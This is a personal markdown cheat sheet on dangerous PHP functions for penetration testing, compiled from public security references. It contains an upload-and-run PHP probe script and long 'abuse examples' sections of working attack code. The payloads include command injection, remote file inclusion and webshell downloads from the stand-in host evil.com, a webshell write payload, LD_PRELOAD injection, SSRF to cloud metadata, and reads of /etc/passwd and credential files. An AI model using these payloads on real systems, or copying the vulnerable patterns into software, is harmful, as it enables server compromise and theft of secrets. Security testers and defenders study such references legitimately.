# php-dangerous functions

**Author:** Julien Bongars\
**Date:** 2026-02-12 14:11:10
**Path:**

---

# Dangerous Functions

source: https://gist.githubusercontent.com/mccabe615/b0907514d34b2de088c4996933ea1720/raw/c67bf65a0fe107cea6f5c6a88b5f3910ff062800/phpdangerousfuncs.md

source: https://stackoverflow.com/a/3697776

source: https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/index.html

## Note

Always check `phpinfo(), exec(), system(), shell_exec()` !

## Script

```php
<?php
// Dangerous PHP Functions Checker
// Usage: Upload and visit in browser

$functions = [
    // Command Execution
    'exec','passthru','system','shell_exec','popen','proc_open','pcntl_exec',

    // PHP Code Execution
    'eval','assert','create_function','include','include_once','require','require_once',

    // Callbacks
    'call_user_func','call_user_func_array','preg_replace_callback','spl_autoload_register',
    'register_shutdown_function','register_tick_function','set_error_handler','set_exception_handler',
    'array_map','array_filter','array_reduce','array_walk','array_walk_recursive',
    'usort','uasort','uksort','iterator_apply','ob_start',

    // Info Disclosure
    'phpinfo','posix_mkfifo','posix_getlogin','posix_ttyname','getenv','get_current_user',
    'proc_get_status','get_cfg_var','disk_free_space','disk_total_space','getcwd',
    'getmygid','getmyinode','getmypid','getmyuid',

    // Filesystem
    'fopen','tmpfile','bzopen','gzopen','chgrp','chmod','chown','copy',
    'file_put_contents','link','mkdir','move_uploaded_file','rename','rmdir',
    'symlink','tempnam','touch','unlink','file_get_contents','file','readfile',
    'parse_ini_file','highlight_file','show_source','php_strip_whitespace','ftp_get','ftp_put',

    // Other
    'extract','parse_str','putenv','ini_set','mail','header','proc_nice',
    'proc_terminate','proc_close','pfsockopen','fsockopen','apache_child_terminate',
    'posix_kill','posix_setpgid','posix_setsid','posix_setuid',
];

echo "=== Dangerous PHP Functions Check ===\n\n";
echo "PHP Version: " . phpversion() . "\n\n";

echo "--- CALLABLE ---\n";
foreach ($functions as $f) {
    if (is_callable($f)) {
        echo "[!] $f\n";
    }
}
?>
```

## Command Execution

```
exec           - Returns last line of commands output
passthru       - Passes commands output directly to the browser
system         - Passes commands output directly to the browser and returns last line
shell_exec     - Returns commands output
\`\` (backticks) - Same as shell_exec()
popen          - Opens read or write pipe to process of a command
proc_open      - Similar to popen() but greater degree of control
pcntl_exec     - Executes a program
```

## PHP Code Execution

#### Apart from eval there are other ways to execute PHP code: include/require can be used for remote code execution in the form of Local File Include and Remote File Include vulnerabilities.

```eval()
assert()  - identical to eval()
preg_replace('/.*/e',...) - /e does an eval() on the match
create_function()
include()
include_once()
require()
require_once()
$_GET['func_name']($_GET['argument']);
$func = new ReflectionFunction($_GET['func_name']); $func->invoke(); or $func->invokeArgs(array());
```

## List of functions which accept callbacks

#### These functions accept a string parameter which could be used to call a function of the attacker's choice. Depending on the function the attacker may or may not have the ability to pass a parameter. In that case an Information Disclosure function like phpinfo() could be used.

```
Function                     => Position of callback arguments
'ob_start'                   =>  0,
'array_diff_uassoc'          => -1,
'array_diff_ukey'            => -1,
'array_filter'               =>  1,
'array_intersect_uassoc'     => -1,
'array_intersect_ukey'       => -1,
'array_map'                  =>  0,
'array_reduce'               =>  1,
'array_udiff_assoc'          => -1,
'array_udiff_uassoc'         => array(-1, -2),
'array_udiff'                => -1,
'array_uintersect_assoc'     => -1,
'array_uintersect_uassoc'    => array(-1, -2),
'array_uintersect'           => -1,
'array_walk_recursive'       =>  1,
'array_walk'                 =>  1,
'assert_options'             =>  1,
'uasort'                     =>  1,
'uksort'                     =>  1,
'usort'                      =>  1,
'preg_replace_callback'      =>  1,
'spl_autoload_register'      =>  0,
'iterator_apply'             =>  1,
'call_user_func'             =>  0,
'call_user_func_array'       =>  0,
'register_shutdown_function' =>  0,
'register_tick_function'     =>  0,
'set_error_handler'          =>  0,
'set_exception_handler'      =>  0,
'session_set_save_handler'   => array(0, 1, 2, 3, 4, 5),
'sqlite_create_aggregate'    => array(2, 3),
'sqlite_create_function'     =>  2,
```

## Information Disclosure

#### Most of these function calls are not sinks. But rather it maybe a vulnerability if any of the data returned is viewable to an attacker. If an attacker can see phpinfo() it is definitely a vulnerability.

```
phpinfo
posix_mkfifo
posix_getlogin
posix_ttyname
getenv
get_current_user
proc_get_status
get_cfg_var
disk_free_space
disk_total_space
diskfreespace
getcwd
getlastmo
getmygid
getmyinode
getmypid
getmyuid
```

## Other

```
extract - Opens the door for register_globals attacks (see study in scarlet).
parse_str -  works like extract if only one argument is given.  
putenv
ini_set
mail - has CRLF injection in the 3rd parameter, opens the door for spam. 
header - on old systems CRLF injection could be used for xss or other purposes, now it is still a problem if they do a header("location: ..."); and they do not die();. The script keeps executing after a call to header(), and will still print output normally. This is nasty if you are trying to protect an administrative area. 
proc_nice
proc_terminate
proc_close
pfsockopen
fsockopen
apache_child_terminate
posix_kill
posix_mkfifo
posix_setpgid
posix_setsid
posix_setuid
```

## Filesystem Functions

#### According to RATS all filesystem functions in php are nasty. Some of these don't seem very useful to the attacker. Others are more useful than you might think. For instance if allow_url_fopen=On then a url can be used as a file path, so a call to copy($_GET['s'], $_GET['d']); can be used to upload a PHP script anywhere on the system. Also if a site is vulnerable to a request send via GET everyone of those file system functions can be abused to channel and attack to another host through your server.

```
// open filesystem handler
fopen
tmpfile
bzopen
gzopen
SplFileObject->__construct
// write to filesystem (partially in combination with reading)
chgrp
chmod
chown
copy
file_put_contents
lchgrp
lchown
link
mkdir
move_uploaded_file
rename
rmdir
symlink
tempnam
touch
unlink
imagepng   - 2nd parameter is a path.
imagewbmp  - 2nd parameter is a path. 
image2wbmp - 2nd parameter is a path. 
imagejpeg  - 2nd parameter is a path.
imagexbm   - 2nd parameter is a path.
imagegif   - 2nd parameter is a path.
imagegd    - 2nd parameter is a path.
imagegd2   - 2nd parameter is a path.
iptcembed
ftp_get
ftp_nb_get
// read from filesystem
file_exists
file_get_contents
file
fileatime
filectime
filegroup
fileinode
filemtime
fileowner
fileperms
filesize
filetype
glob
is_dir
is_executable
is_file
is_link
is_readable
is_uploaded_file
is_writable
is_writeable
linkinfo
lstat
parse_ini_file
pathinfo
readfile
readlink
realpath
stat
gzfile
readgzfile
getimagesize
imagecreatefromgif
imagecreatefromjpeg
imagecreatefrompng
imagecreatefromwbmp
imagecreatefromxbm
imagecreatefromxpm
ftp_put
ftp_nb_put
exif_read_data
read_exif_data
exif_thumbnail
exif_imagetype
hash_file
hash_hmac_file
hash_update_file
md5_file
sha1_file
highlight_file
show_source
php_strip_whitespace
get_meta_tags
```

## PHP Dangerous Functions - Abuse Examples

#### Command Execution

```php
// exec - attacker runs OS commands
exec($_GET['cmd'], $output); // ?cmd=whoami

// passthru - output goes straight to browser
passthru($_GET['cmd']); // ?cmd=cat /etc/passwd

// system - same idea
system($_GET['cmd']); // ?cmd=id

// shell_exec - returns output as string
echo shell_exec($_GET['cmd']); // ?cmd=ls -la

// backticks - shorthand for shell_exec
echo `{$_GET['cmd']}`; // ?cmd=uname -a

// popen - opens a process pipe
$handle = popen($_GET['cmd'], 'r'); // ?cmd=netstat -an
echo fread($handle, 4096);

// proc_open - more control over process
$proc = proc_open($_GET['cmd'], [1 => ['pipe', 'w']], $pipes);
echo stream_get_contents($pipes[1]);

// pcntl_exec - replaces current process entirely
pcntl_exec("/bin/bash", ["-c", $_GET['cmd']]);
```

#### PHP Code Execution

```php
// eval - executes string as PHP
eval($_GET['code']); // ?code=system('whoami');

// assert - identical to eval in older PHP
assert($_GET['code']); // ?code=system('id')

// preg_replace with /e (PHP < 7.0)
preg_replace('/.*/e', $_GET['code'], 'test'); // ?code=system('id')

// create_function - hidden eval (deprecated PHP 7.2+)
$f = create_function('', $_GET['code']); // ?code=system('id');
$f();

// include/require - Local/Remote File Inclusion
include($_GET['page']); // ?page=http://evil.com/shell.txt
include($_GET['page']); // ?page=php://filter/convert.base64-encode/resource=config
include($_GET['page']); // ?page=phar://uploads/evil.jpg/shell

// Dynamic function call
$_GET['func']($_GET['arg']); // ?func=system&arg=whoami

// ReflectionFunction
$f = new ReflectionFunction($_GET['func']); // ?func=system
$f->invoke($_GET['arg']);                    // ?arg=whoami
```

## Callback Functions

```php
// call_user_func - directly calls any function
call_user_func($_GET['func'], $_GET['arg']); // ?func=system&arg=id

// call_user_func_array
call_user_func_array($_GET['func'], [$_GET['arg']]); // ?func=system&arg=id

// array_map - callback on every element
array_map($_GET['func'], [$_GET['arg']]); // ?func=system&arg=whoami

// array_filter - callback as filter
array_filter([$_GET['arg']], $_GET['func']); // ?func=system&arg=id

// array_walk - callback per element
array_walk(['id'], function(&$v) { system($v); });

// usort/uasort/uksort - comparison callback
usort([$_GET['arg'], ''], $_GET['func']); // ?func=system&arg=id

// ob_start - output buffer callback
ob_start($_GET['func']); echo $_GET['arg']; ob_end_flush(); // ?func=system&arg=id

// preg_replace_callback
preg_replace_callback('/.+/', $_GET['func'], $_GET['arg']); // ?func=system&arg=id

// register_shutdown_function - runs at script end
register_shutdown_function($_GET['func'], $_GET['arg']); // ?func=system&arg=id

// set_error_handler - triggers on errors
set_error_handler($_GET['func']); // ?func=system
trigger_error($_GET['arg']);

// spl_autoload_register - triggers on class load
spl_autoload_register($_GET['func']); // then reference undefined class

// iterator_apply
iterator_apply(new ArrayIterator([$_GET['arg']]), $_GET['func']);

// assert_options
assert_options(ASSERT_CALLBACK, $_GET['func']); // callback on failed assert
assert(false);
```

## Information Disclosure

```php
// phpinfo - dumps entire environment
phpinfo(); // server paths, env vars, DB creds, PHP config, modules

// getenv - read specific env vars
echo getenv('DATABASE_URL');    // database credentials
echo getenv('AWS_SECRET_KEY');  // cloud keys

// get_current_user - OS user running PHP
echo get_current_user(); // e.g. "www-data"

// getcwd - current working directory
echo getcwd(); // /var/www/html/app - reveals server structure

// disk_free_space / disk_total_space
echo disk_free_space('/'); // server disk info, useful for recon

// getmypid - process ID
echo getmypid(); // useful for /proc/self/ attacks

// getmyuid / getmygid
echo getmyuid(); // UID of PHP process, helps understand permissions

// get_cfg_var - read php.ini values
echo get_cfg_var('open_basedir'); // see restrictions (or lack of)

// proc_get_status - info about a running process
$p = proc_open('sleep 10', [], $pipes);
print_r(proc_get_status($p));

// posix_getlogin
echo posix_getlogin(); // logged-in user

// posix_ttyname
echo posix_ttyname(0); // terminal name
```

## Other

```php
// extract - overwrites variables from user input
extract($_GET); // ?admin=1 -> $admin = 1, bypass auth checks

// parse_str - same issue without second argument
parse_str($_GET['data']); // ?data=admin=1 -> $admin = 1

// putenv - set environment variables
putenv("LD_PRELOAD=/tmp/evil.so"); // library injection
mail('','','',''); // triggers LD_PRELOAD

// ini_set - change PHP config at runtime
ini_set('allow_url_include', '1'); // enable remote includes
ini_set('open_basedir', '/');      // remove directory restrictions

// mail - CRLF injection in headers
mail($_GET['to'], 'subject', 'body', $_GET['headers']);
// ?headers=Bcc:victim@example.com -> spam relay

// header - redirect bypass / CRLF injection
header("Location: " . $_GET['url']); // open redirect
// without die() -> code continues executing after redirect

// fsockopen / pfsockopen - SSRF
$fp = fsockopen($_GET['host'], $_GET['port']); // ?host=169.254.169.254&port=80
// -> hit cloud metadata, internal services

// proc_nice / proc_terminate / proc_close
proc_nice(-20);       // steal CPU priority
proc_terminate($proc); // kill processes

// posix_kill
posix_kill($_GET['pid'], 9); // kill arbitrary processes

// posix_setuid
posix_setuid(0); // attempt to escalate to root

// posix_setsid / posix_setpgid
posix_setsid(); // detach from terminal, create daemon
```

## Filesystem (Selected Highlights)

```php
// file_get_contents - read arbitrary files / SSRF
echo file_get_contents($_GET['f']); // ?f=/etc/passwd
echo file_get_contents($_GET['f']); // ?f=http://169.254.169.254/latest/meta-data/

// file_put_contents - write webshells
file_put_contents($_GET['f'], $_GET['data']); // ?f=shell.php&data=<?php system($_GET['c']);?>

// copy - copy remote shell to server
copy($_GET['s'], $_GET['d']); // ?s=http://evil.com/shell.txt&d=shell.php

// move_uploaded_file - obvious webshell upload
move_uploaded_file($_FILES['f']['tmp_name'], 'uploads/' . $_FILES['f']['name']);

// unlink - delete files
unlink($_GET['f']); // ?f=.htaccess -> remove security config

// chmod - change permissions
chmod($_GET['f'], 0777); // ?f=uploads/ -> make directory writable

// rename - rename files to bypass restrictions
rename('shell.txt', 'shell.php'); // bypass upload filter

// symlink - create symlink to read restricted files
symlink('/etc/passwd', 'link.txt'); // then read link.txt via web

// mkdir / rmdir
mkdir($_GET['dir']); // create arbitrary directories
rmdir($_GET['dir']); // delete directories

// readfile - read and output files directly
readfile($_GET['f']); // ?f=../config.php

// parse_ini_file - read config files
print_r(parse_ini_file($_GET['f'])); // ?f=../config.ini

// highlight_file / show_source - display source code
highlight_file($_GET['f']); // ?f=config.php -> leaks credentials

// getimagesize - SSRF via URL
getimagesize($_GET['url']); // ?url=http://internal-service/

// exif_read_data - code exec via crafted EXIF
exif_read_data('uploaded_image.jpg'); // malicious EXIF metadata
```
